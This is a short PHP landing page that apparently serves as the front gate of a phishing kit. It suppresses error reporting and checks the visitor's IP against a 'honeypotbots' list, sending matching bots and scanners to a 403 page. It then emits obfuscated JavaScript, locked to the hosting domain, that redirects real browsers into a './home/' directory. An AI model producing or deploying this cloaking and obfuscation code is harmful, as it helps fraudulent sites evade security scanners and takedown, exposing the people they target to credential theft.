<?php

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');


$honeypotbots = file_get_contents('./home/honeypotbots.dat');
$errorUrl = 'Error.php';
$ip = getenv('REMOTE_ADDR');

if (stripos($honeypotbots, $ip) !== false) {
  
    header('Location: ./403.php');
	  
     exit();

}

require_once './home/includes/HunterObfuscator.php';

$jsCode = " window.onload = function(){
		 if (typeof(Storage) !== 'undefined') {
  location.replace('./home/?storage='+ location.host);
} else { 
  location.replace('403.php');
}		
 } "; //Simple JS code

$hunter = new HunterObfuscator($jsCode); //Initialize with JS code in parameter
$hunter->addDomainName($_SERVER['HTTP_HOST']);
$obsfucated = $hunter->Obfuscate(); //Do obfuscate and get the obfuscated code


?>

<!doctype html>

<html>
<body>
 
 
<?php  echo "<script>  " . $obsfucated . "  </script>"; ?>

</body>

</html>

